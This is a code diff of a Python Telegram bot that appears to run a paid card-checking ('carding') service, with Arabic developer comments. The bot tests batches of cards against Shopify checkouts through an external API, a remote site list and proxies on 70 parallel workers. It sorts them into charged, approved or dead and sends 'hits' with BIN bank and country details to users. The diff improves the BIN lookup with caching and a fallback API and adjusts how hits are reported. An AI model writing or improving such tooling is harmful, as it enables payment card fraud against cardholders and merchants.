@@ -84,12 +84,10 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# [تعديل مستهدف] تم ربط الـ API الجديد الخاص بك كعنوان فحص رئيسي ومباشر لشوبيفاي
 SHOPIFY_API_URL_1 = 'https://web-production-3d364.up.railway.app/shopify'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
-# إعدادات السرعة الفائقة المعتمدة لـ 70 خيط متوازي وثبات الـ CPM
 WORKERS = 70  
 DELAY = 1.6  
 HIT_DELAY = 1.0
@@ -104,7 +102,6 @@ USER_LAST_REQ = {}
 ACTIVE_MTXT_PROCESSES = {}
 PENDING_FILES = {}
 
-# نظام الفلترة الذكي السريع لمنع التضارب
 _RATE_LIMIT_EVENT = None
 _IS_COOLING_DOWN = False
 _COOLDOWN_LOCK = asyncio.Lock()
@@ -199,13 +196,15 @@ CE_SNOW = '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>'
 CE_BOOM = '<tg-emoji emoji-id="5276032951342088188">💥</tg-emoji>'
 
 # ====================== BULLETPROOF CONFIGS ======================
-ALL_COUNTRY_CODES = ["AE","AF","AR","AT","AU","BE","BG","BR","CA","CH","CL","CN","CO","CR","CZ","DE","DK","DZ","EC","EE","EG","ES","FI","FR","GB","GR","HK","HR","HU","ID","IE","IL","IN","IT","JP","KR","KW","KZ","LB","LT","LU","LV","MA","MT","MX","MY","NG","NL","NO","NZ","OM","PA","PE","PH","PK","PL","PT","QA","RO","RS","RU","SA","SE","SG","SI","SK","TH","TR","TW","UA","US","UY","VN","ZA"]
-COUNTRY_FLAGS = {code: chr(ord(code[0]) + 127397) + chr(ord(code[1]) + 127397) for code in ALL_COUNTRY_CODES}
-
+# دالة توليد العلم الذكي ديناميكياً بدون الاعتماد على مصفوفة ثابتة تسبب علماً أبيض
 def get_flag_emoji(country_code, fallback="🏳️"):
     if not country_code or len(country_code) != 2: return fallback
     c = country_code.upper()
-    return COUNTRY_FLAGS.get(c, chr(ord(c[0]) + 127397) + chr(ord(c[1]) + 127397) if c.isalpha() else fallback)
+    if c in ["-", "UNKNOWN", ""]: return fallback
+    try:
+        return chr(ord(c[0]) + 127397) + chr(ord(c[1]) + 127397)
+    except Exception:
+        return fallback
 
 WELCOME_GIF = "https://i.giphy.com/3o7aD2d7hy9ktXNDP2.gif"
 REDEEM_GIF = "https://i.giphy.com/l41YkxvU8c7J7Bba0.gif"
@@ -233,6 +232,7 @@ PAID_TIERS = ["Core", "Elite", "Root", "X"]
 
 _GIF_FILE_IDS = {}
 _system_locks = {}
+_BIN_CACHE = {}  # الذاكرة التخزينية الفائقة لمنع الحظر وجلب البيانات فوراً
 
 def get_system_lock(name: str):
     if name not in _system_locks: _system_locks[name] = asyncio.Lock()
@@ -501,26 +501,73 @@ async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
     return False
 
+# [تعديل مستهدف وفوري] تم تطوير محرك جلب معلومات الـ BIN بالكاش والـ API الاحتياطي المزدوج لمنع السقوط
 async def get_bin_info(bin_code, session=None):
+    b6 = str(bin_code)[:6]
+    if b6 in _BIN_CACHE: 
+        return _BIN_CACHE[b6]
+        
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+    }
+    
+    # المحاولة الأولى: سيرفر Antipublic
     try:
-        url = f"https://bins.antipublic.cc/bins/{bin_code[:6]}"
-        if session and not session.closed:
-            async with session.get(url, timeout=5) as r:
-                if r.status == 200: return await r.json()
-        else:
-            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as local_sess:
-                async with local_sess.get(url) as r:
-                    if r.status == 200: return await r.json()
+        url1 = f"https://bins.antipublic.cc/bins/{b6}"
+        async def fetch1(s):
+            async with s.get(url1, headers=headers, timeout=4) as r:
+                if r.status == 200:
+                    data = await r.json()
+                    if data and isinstance(data, dict) and data.get('brand'): return data
+                return None
+        
+        res = await fetch1(session) if (session and not session.closed) else await fetch1(aiohttp.ClientSession())
+        if res:
+            parsed = {
+                "brand": str(res.get("brand", "-")).upper(),
+                "type": str(res.get("type", "-")).upper(),
+                "level": str(res.get("level", "-")).upper(),
+                "bank": str(res.get("bank", "-")).upper(),
+                "country": str(res.get("country", "-")).upper(),
+                "country_code": str(res.get("country_code", "")).upper().strip(),
+                "flag": res.get("flag", "")
+            }
+            _BIN_CACHE[b6] = parsed
+            return parsed
     except Exception: pass
+
+    # المحاولة الثانية (الاحتياطية): سيرفر HandyAPI في حال فشل أو حظر السيرفر الأول
+    try:
+        url2 = f"https://data.handyapi.com/bin/{b6}"
+        async def fetch2(s):
+            async with s.get(url2, headers=headers, timeout=4) as r:
+                if r.status == 200: return await r.json()
+                return None
+                
+        res2 = await fetch2(session) if (session and not session.closed) else await fetch2(aiohttp.ClientSession())
+        if res2 and res2.get("Status") == "SUCCESS":
+            country_obj = res2.get("Country", {})
+            bank_obj = res2.get("Bank", {})
+            parsed = {
+                "brand": str(res2.get("Scheme", "-")).upper(),
+                "type": str(res2.get("Type", "-")).upper(),
+                "level": str(res2.get("CardTier", "-")).upper(),
+                "bank": str(bank_obj.get("Name", "-")).upper(),
+                "country": str(country_obj.get("Name", "-")).upper(),
+                "country_code": str(country_obj.get("A2", "")).upper().strip(),
+                "flag": ""
+            }
+            _BIN_CACHE[b6] = parsed
+            return parsed
+    except Exception: pass
+
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
-# [تعديل مستهدف بالكامل] تم دمج الـ API الجديد وتنسيق الردود بدقة لمنع ظهور أخطاء 504 و 405 بشكل قطعي
 async def check_shopify_api(api_url, card, site, proxy, session):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
         proxy_param = f"&proxy={proxy_str}" if proxy else "&proxy="
         
-        # التأكد من تمرير الدومين بالبروتوكول الكامل ليتوافق مع الـ API الجديد
         site_param = site.strip()
         if not site_param.startswith("http"):
             site_param = f"https://{site_param}"
@@ -532,7 +579,6 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         }
         
         async with session.get(req_url, headers=headers, timeout=18) as resp:
-            # فلترة فورية لأخطاء خادم الـ API لمنع سقوط الـ Workers بـ 504 أو 405
             if resp.status in [405, 429, 502, 503, 504]:
                 return {'status': 'Rate Limit', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
                 
@@ -543,13 +589,11 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             try: 
                 rj = json.loads(text_data)
             except Exception: 
-                # فحص احتياطي للـ Raw Text في حال رجوع استجابة نصية مباشرة غير مفرومة
                 tl = text_data.lower()
                 if "charged" in tl or "success" in tl:
                     return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'Shopify', 'price': '$10.00'}
                 return {'status': 'Site Error', 'message': 'Format Error', 'card': card, 'retry': True}
             
-        # معالجة معاملات ردود الـ API الجديد بدقة فائقة
         if not rj.get('status', True) and 'error' in rj:
             return {'status': 'Site Error', 'message': rj.get('error', 'API Blocked'), 'card': card, 'retry': True}
             
@@ -641,12 +685,17 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
     if lr: return {'status': 'Dead', 'message': f'{str(lr["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': lr.get('price', '-')}
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': gateway_name, 'price': '-'}
 
+# [تعديل مستهدف] تم تطوير آلية الفرز والتنقية للعلم ليعمل بدقة وبدون تحول للون الأبيض
 def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
     bi = bin_info or {}
     ps = sf(f"{str(price)}") if price and price != "-" else sf("-")
     h = f"<b>{CE_CROWN} {sf('PAYMENT SUCCEEDED')} {CE_PARTY}</b>"
+    
     country_code = str(bi.get('country_code', '')).strip()
-    flag = get_flag_emoji(country_code) if country_code else "🏳️"
+    flag = bi.get('flag')
+    if not flag or str(flag).strip() in ["", "🏳️", "-"]:
+        flag = get_flag_emoji(country_code)
+        
     cd = f"{sf(bi.get('country', '-'))} {flag}"
     
     return f"""{h}
@@ -664,15 +713,13 @@ def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
 
 <b>{CE_CHART} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>"""
 
-# [تعديل مستهدف] تم إغلاق وتعطيل إرسال إشعارات الصيد للمجموعات العامة كلياً لحماية الخصوصية بناءً على طلبك
 async def _send_global_hit(gateway, price, uid, bot, elapsed, card, session, response_msg="Card Charged"):
-    # معطلة تماماً لعدم إرسال أي رسائل صيد للقروب المحدد
     return
 
 async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session):
     await asyncio.sleep(HIT_DELAY)
     try:
-        bi = await get_bin_info(card.split("|")[0], session)
+        bi = await get_bin_info(card.split("|")[0][:6], session)
         msg = format_card_result(card, gateway, price, bi, elapsed)
         kb = [[InlineKeyboardButton("Contact Owner", url="https://t.me/Dddadddyttt", style="primary", icon_custom_emoji_id="5445059250382469069")]]
         await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
@@ -1158,10 +1205,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     
                     if status == 'Charged':
                         chg += 1
-                        # يتم إرسال نتيجة الصيدة للشخص بشكل منفرد وخاص فقط لحفظ الأمان والخصوصية
                         asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
-                        # تم حجب السطر الخاص بإرسال النتيجة إلى المجموعات العامة بناءً على توجيهاتك الصارمة
-                        # asyncio.create_task(_send_global_hit(gateway=gate_name, price=res.get('price', '-'), uid=uid, bot=bot, elapsed=c_el, card=card, session=http_session, response_msg=res.get('message', 'Card Charged')))
                     elif status == 'Approved': app += 1
                     elif status == 'Insufficient': ins += 1
                     elif status == 'Site Error': err += 1
